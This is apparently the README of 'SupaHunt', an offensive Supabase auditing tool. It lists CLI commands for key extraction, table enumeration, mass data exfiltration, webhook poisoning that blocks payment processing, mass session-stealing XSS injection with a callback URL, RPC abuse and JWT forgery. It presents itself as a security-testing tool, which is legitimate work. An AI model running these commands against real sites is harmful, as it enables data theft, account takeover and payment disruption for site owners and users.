<p align="center">
  <h1 align="center">SupaHunt</h1>
  <p align="center">
    <b>Supabase Security Auditing & Penetration Testing Framework</b>
  </p>
  <p align="center">
    <img src="https://img.shields.io/badge/python-3.8+-blue.svg" alt="Python">
    <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License">
    <img src="https://img.shields.io/badge/version-3.0-red.svg" alt="Version">
    <img src="https://img.shields.io/badge/supabase-offensive-orange.svg" alt="Supabase">
  </p>
</p>

---

**SupaHunt** automatically discovers, enumerates, and exploits Supabase instances. Point it at any URL using Supabase — it extracts the anon key from JS bundles, maps the entire database via GraphQL introspection, tests every RLS policy, and chains vulnerabilities into full kill chains.

Built from real-world bug bounty experience testing production Supabase applications.

> **Disclaimer**: For authorized security testing and bug bounty programs only. See [SECURITY.md](SECURITY.md).

---

## Features

### Core Capabilities

| Capability | Details |
|-----------|---------|
| **Auto-Discovery** | Extracts Supabase URL + anon key from HTML, `__NEXT_DATA__`, JS chunks, build manifests |
| **Enhanced Discovery (v2)** | Source map analysis, secret extraction from JS bundles, API route probing, multi-project detection |
| **Service Role Detection** | Flags leaked `service_role` keys in client-side code |
| **Table Enumeration** | GraphQL introspection + brute-force of 100+ common table names |
| **RLS Testing** | Automated SELECT/INSERT/UPDATE/DELETE permission testing per table |
| **RPC Auditing** | Discovers and probes dangerous functions (cleanup, delete, financial) |
| **JWT Injection** | Tests `user_metadata` claim injection via `PUT /auth/v1/user` |
| **Role Escalation** | Tests profile role field mutability (admin, moderator, etc.) |
| **GraphQL Exploitation** | Full schema introspection, mutation RLS bypass audit, INSERT/UPDATE/DELETE testing |
| **Storage Buckets** | Enumerates buckets, lists files, tests upload permissions, MIME bypass, SVG XSS |
| **PostgREST Filter Injection** | Tests `.or()` / `.filter()` injection on all endpoints |
| **Data Exfiltration** | Batch extraction with progress tracking |
| **Auto-Reporting** | Markdown + JSON reports with CVSS-scored findings |

### v3.0 — Advanced Exploitation Modules

| Module | Details |
|--------|---------|
| **Webhook Poisoner** | Auto-discovers webhook idempotency tables, injects fake event IDs to block real payment processing. Supports Stripe, Paddle, LemonSqueezy — auto-detects provider |
| **Review/XSS Injector** | Auto-discovers UGC tables + content catalogs via GraphQL introspection, mass-injects XSS payloads across entire catalogs. Schema-aware field mapping — adapts to any schema |
| **RPC Abuser** | Auto-discovers all RPCs via GraphQL, classifies by 9 danger categories (evidence destruction, financial, subscription, auth manipulation...), builds dynamic attack chains |
| **Token Forger** | JWT secret bruteforce (25+ common defaults), service_role JWT forgery, generic HMAC token forgery, custom JWT with arbitrary claims |

---

## Install

### pip (recommended)

```bash
git clone https://github.com/MikeRoss27/supahunt.git
cd supahunt
pip install .
```

After install, `supahunt` is available as a global command:

```bash
supahunt full https://target.com
```

### Docker

```bash
docker build -t supahunt .
docker run --rm -v $(pwd)/output:/opt/supahunt/output supahunt full https://target.com
```

### Manual

```bash
git clone https://github.com/MikeRoss27/supahunt.git
cd supahunt
pip install -r requirements.txt
python3 supahunt.py full https://target.com
```

---

## Usage

### Quick Start

```bash
# Full automated kill chain — 12 phases
python3 supahunt.py full https://target.com

# Safe recon only (no exploitation, no exfil)
python3 supahunt.py full https://target.com --no-exploit --no-exfil
```

### Commands

```bash
# Discovery & Enumeration
python3 supahunt.py discover https://target.com         # Basic auto-discovery
python3 supahunt.py discover2 https://target.com        # Enhanced (source maps, secrets, API routes)
python3 supahunt.py scan https://target.com             # Recon scan (no exploitation)
python3 supahunt.py enum https://target.com             # Enumerate tables, RPCs, storage, GraphQL

# Exploitation
python3 supahunt.py exploit https://target.com          # Auth, JWT injection, role escalation, RPC
python3 supahunt.py graphql https://target.com          # GraphQL mutation RLS audit
python3 supahunt.py storage https://target.com          # Storage bucket audit + XSS
python3 supahunt.py filters https://target.com          # PostgREST filter injection

# v3 Attack Modules
python3 supahunt.py webhook https://target.com          # Webhook idempotency poisoning
python3 supahunt.py reviews https://target.com          # Mass XSS review/content injection
python3 supahunt.py rpc-abuse https://target.com        # Auto-discover & exploit RPCs
python3 supahunt.py forge https://target.com            # JWT bruteforce + token forgery

# Data Extraction
python3 supahunt.py exfil https://target.com            # Mass data exfiltration

# Full Kill Chain
python3 supahunt.py full https://target.com             # All 12 phases
```

### Advanced Options

```bash
# Skip discovery — provide Supabase config directly
python3 supahunt.py full https://target.com \
  --supabase-url https://xxxxx.supabase.co \
  --anon-key eyJhbGci...

# Use existing auth token (skip account creation)
python3 supahunt.py full https://target.com --token eyJhbGci...

# Route through Burp/ZAP proxy
python3 supahunt.py full https://target.com --proxy http://127.0.0.1:8080

# Add custom table names to probe
python3 supahunt.py enum https://target.com --tables invoices,receipts,secrets

# Keep test artifacts (don't clean up injected data)
python3 supahunt.py reviews https://target.com --no-cleanup

# Control rate limiting, threads, and timeout
python3 supahunt.py full https://target.com --rate-limit 5 --threads 20 --timeout 30
```

### Webhook Poisoner Options

```bash
# Poison with 200 fake events per Stripe event type
python3 supahunt.py webhook https://target.com --events-per-type 200

# Keep injected events (don't cleanup)
python3 supahunt.py webhook https://target.com --no-cleanup
```

### Review/XSS Injector Options

```bash
# Inject with session-stealing XSS payload
python3 supahunt.py reviews https://target.com \
  --user-id 00000000-0000-0000-0000-000000000000 \
  --xss-payload session_steal \
  --callback-url https://your-callback.example.com \
  --signature "security-audit"

# Available XSS payloads: minimal, exfil, session_steal, defacement, polyglot
```

### Token Forger Options

```bash
# JWT bruteforce with custom wordlist
python3 supahunt.py forge https://target.com --jwt-wordlist /path/to/secrets.txt

# Test HMAC token forgery with a discovered secret
python3 supahunt.py forge https://target.com --ad-secret "discovered-secret-value"
```

---

## Full Kill Chain — 12 Phases

When running `supahunt.py full`, the tool executes these phases sequentially:

| Phase | Module | What It Does |
|-------|--------|-------------|
| 1 | Discovery (v2) | Source maps, secrets, API routes, multi-project detection |
| 2 | Enumeration | Tables, RPCs, storage buckets, GraphQL introspection |
| 3 | Auth Exploitation | Account creation, JWT injection, role escalation, RPC testing |
| 4 | GraphQL RLS Audit | INSERT/UPDATE/DELETE mutation testing on all collections |
| 5 | Storage Audit | Bucket enumeration, upload testing, MIME bypass, SVG XSS |
| 6 | Filter Injection | PostgREST `.or()` / `.filter()` injection on all tables |
| 7 | Data Exfiltration | Batch extraction of all readable tables |
| 8 | Webhook Poisoning | Auto-discover + poison idempotency tables |
| 9 | Review/XSS Injection | Auto-discover UGC + content tables, mass XSS injection |
| 10 | RPC Abuse | Auto-discover + classify + exploit all exposed RPCs |
| 11 | Token Forgery | JWT secret bruteforce + service_role forgery |
| 12 | Report | Markdown + JSON reports with all findings |

---

## Modules

### `discovery.py` + `discovery_v2.py` — Target Reconnaissance
- Fetches target HTML, extracts inline Supabase config
- Crawls JS bundles (Next.js, Vite, React, SvelteKit) for keys
- Parses `__NEXT_DATA__`, build manifests, source maps
- Extracts hardcoded secrets from JS bundles
- Detects multiple Supabase projects in the same app
- Probes common API routes (`/api/*`)
- Validates JWT keys (anon vs service_role)
- Fetches GoTrue `/auth/v1/settings` (signup, autoconfirm, providers)

### `enumerator.py` — Database Mapping
- GraphQL `__schema` introspection for all collections
- Brute-force 100+ common Supabase table names via REST
- Per-table RLS testing (SELECT/INSERT/UPDATE/DELETE)
- Record count extraction via `Content-Range` headers
- Column discovery from response data
- RPC function enumeration via GraphQL mutations
- Storage bucket listing + file enumeration

### `exploiter.py` — Vulnerability Exploitation
- **AuthExploiter**: Account creation, JWT claim injection, token refresh
- **ProfileExploiter**: Role escalation, sensitive field mutation, stored XSS via avatar_url
- **RPCExploiter**: Dangerous function execution (cleanup, expire, financial)
- **DataExploiter**: IDOR testing, cross-user data access, batch extraction
- **PersistenceExploiter**: OAuth state backdoor injection

### `graphql_tester.py` — GraphQL Mutation RLS Audit
- Full mutation schema extraction (INSERT/UPDATE/DELETE)
- Per-collection INSERT testing with schema-aware payloads
- UPDATE/DELETE permission testing
- Automatic cleanup of test data

### `storage_exploiter.py` — Storage Security Audit
- Bucket enumeration and file listing
- Upload permission testing
- MIME type validation bypass
- SVG XSS upload testing
- Content-Security-Policy analysis

### `filter_injection.py` — PostgREST Filter Injection
- Tests 10+ injection vectors on `.or()` / `.filter()` params
- Both Supabase REST and app-level API route testing
- Boolean-based and error-based detection

### `webhook_poisoner.py` — Webhook Idempotency Poisoning
- Auto-discovers webhook/event tables via GraphQL introspection
- Supports Stripe, Paddle, LemonSqueezy (auto-detects provider)
- Schema-aware event object building
- GraphQL batch INSERT with REST fallback
- Cleanup and verification

### `review_injector.py` — Mass XSS Content Injection
- Auto-discovers UGC tables (reviews, comments, feedback, etc.) via GraphQL
- Auto-discovers content tables (products, articles, movies, etc.)
- Schema-aware field mapping by convention (user_id, title, content, etc.)
- 5 XSS payload templates (minimal, exfil, session_steal, defacement, polyglot)
- Aliased GraphQL mutations for UPDATE bypass (Supabase single-record limit)
- Cleanup + save/load injected IDs for later cleanup

### `rpc_abuser.py` — RPC Auto-Discovery & Exploitation
- Auto-discovers all RPCs via GraphQL introspection
- Classifies by 9 danger categories using keyword pattern matching:
  - Evidence destruction, user management, financial, subscription
  - Notification, data modification, admin info, budget drain, auth manipulation
- Auto-fills parameters by type (UUID, int, float, bool, etc.)
- Dynamic attack chains built from discovered callable RPCs
- Repeat-call support for drain/spam attacks

### `token_forger.py` — Token Forgery
- JWT secret bruteforce with 25+ common Supabase defaults
- Custom wordlist support
- `service_role` JWT forgery for full RLS bypass
- Custom JWT forgery with arbitrary claims
- Generic HMAC token forgery (configurable algorithm, encoding, truncation)
- Forged token verification against live endpoints

### `reporter.py` — Report Generation
- Structured findings with severity, CVSS, evidence, remediation
- Markdown report with executive summary
- JSON export for integration with other tools
- Table/RPC/bucket/GraphQL inventory

---

## Nuclei Templates

Custom Nuclei templates for passive/active Supabase checks:

```bash
nuclei -t templates/supabase-misconfig.yaml -u https://target.com -var anon_key=eyJ...
```

| Template | Severity | Check |
|----------|----------|-------|
| `supabase-auth-settings-leak` | Medium | Auth settings disclosure |
| `supabase-graphql-introspection` | High | GraphQL schema exposed |
| `supabase-autoconfirm-enabled` | High | No email verification |
| `supabase-jwt-claim-injection` | Critical | user_metadata writable |
| `supabase-storage-buckets-list` | Medium | Bucket enumeration |
| `supabase-rpc-dangerous-functions` | Critical | Admin RPCs callable |

---

## Output

```
output/
├── supahunt-{project_ref}-{timestamp}.md    # Markdown report
├── supahunt-{project_ref}-{timestamp}.json  # JSON report
├── reviews/
│   └── injected_ids.json                    # For later cleanup
└── exfil/
    ├── profiles.json
    ├── users.json
    └── ...
```

---

## Common Vulnerability Patterns

SupaHunt tests for these Supabase-specific vulnerability classes:

| Class | Description |
|-------|-------------|
| **RLS Bypass** | Tables with `USING (true)` or `WITH CHECK (true)` policies |
| **GraphQL RLS Bypass** | INSERT/UPDATE/DELETE mutations with no RLS enforcement |
| **JWT Injection** | `PUT /auth/v1/user` accepting arbitrary `user_metadata` |
| **JWT Secret Bruteforce** | Weak/default signing secrets allowing service_role forgery |
| **SECURITY DEFINER RPCs** | Functions executing with creator privileges, no auth check |
| **GraphQL Schema Leak** | Introspection exposing all tables, columns, relationships |
| **Auto-Confirm Signup** | `mailer_autoconfirm: true` enabling mass account creation |
| **Storage Misconfiguration** | Public buckets or missing upload restrictions |
| **SVG XSS via Storage** | Uploadable SVG files executing JavaScript |
| **Service Role Key Leak** | `service_role` JWT in client-side JavaScript |
| **IDOR via RPC** | Functions accepting `user_id` param without ownership check |
| **Webhook Table Poisoning** | Unprotected idempotency tables allowing payment disruption |
| **PostgREST Filter Injection** | Unsanitized input in `.or()` / `.filter()` calls |
| **Stored XSS via UGC** | No input sanitization on review/comment/feedback tables |
| **HMAC Token Forgery** | Hardcoded secrets in client-side code enabling token forging |

---

## Architecture

```
supahunt.py              # CLI entry point (14 commands, 12-phase kill chain)
modules/
├── base.py              # BaseModule: HTTP session, rate limiting, retry, helpers
├── discovery.py         # Target auto-detection from any URL
├── discovery_v2.py      # Enhanced: source maps, secrets, API probing
├── enumerator.py        # Table/RPC/storage/GraphQL enumeration
├── exploiter.py         # Auth, profile, RPC, data, persistence exploitation
├── graphql_tester.py    # GraphQL mutation RLS audit
├── storage_exploiter.py # Storage bucket security testing
├── filter_injection.py  # PostgREST filter injection
├── webhook_poisoner.py  # Webhook idempotency poisoning
├── review_injector.py   # Mass XSS content injection
├── rpc_abuser.py        # RPC auto-discovery & exploitation
├── token_forger.py      # JWT bruteforce + token forgery
└── reporter.py          # Markdown + JSON report generation
templates/
└── supabase-misconfig.yaml  # Nuclei templates
```

---

## Contributing

PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).

**Important**: No real target data in PRs — use `https://target.com` or `https://xxxxx.supabase.co` as examples.

## License

[MIT](LICENSE)
